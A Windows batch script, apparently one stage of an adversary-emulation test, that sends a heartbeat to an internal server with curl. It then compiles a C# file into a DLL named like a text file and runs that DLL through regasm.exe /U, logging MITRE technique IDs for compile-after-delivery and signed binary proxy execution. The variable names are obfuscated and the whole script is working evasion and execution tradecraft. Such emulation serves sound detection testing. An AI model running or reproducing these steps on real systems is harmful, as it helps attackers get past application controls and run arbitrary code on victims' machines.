@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8642\1905b12d
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8642-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=mspaint.txt
SET njozco=file.txt
SET kkjwr=8642

SET zzzabb=%APPDATA%\%ufeybybm%
SET qsntd=%zzzabb%\macula-simulations.log
SET cscexe=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_initiated>> "%qsntd%" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: heartbeat_complete>> "%qsntd%" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_start>> "%qsntd%" 2>nul
cd /d "!recnn!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: chdir_complete>> "%qsntd%" 2>nul

SET zjaqbc=1
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=[!zjaqbc!]:>> "%qsntd%" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_start>> "%qsntd%" 2>nul
"!cscexe!" /nologo /target:library /out:"!hpnjatpj!" "!njozco!" 2>nul
if exist "!hpnjatpj!" (
    SET zjaqbc=1
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_success>> "%qsntd%" 2>nul
) else (
    SET zjaqbc=0
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: compilation_failed>> "%qsntd%" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=[!zjaqbc!]:>> "%qsntd%" 2>nul

SET qjvnxy=1
echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_start>> "%qsntd%" 2>nul
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U "!hpnjatpj!" 2>nul
if !ERRORLEVEL! EQU 0 (
    SET qjvnxy=1
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_success>> "%qsntd%" 2>nul
) else (
    SET qjvnxy=0
    echo [!DATE! !TIME!][DEBUG][!lqyereup!]: execution_failed>> "%qsntd%" 2>nul
)
echo [!DATE! !TIME!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed Binary Proxy Execution=[!qjvnxy!]:>> "%qsntd%" 2>nul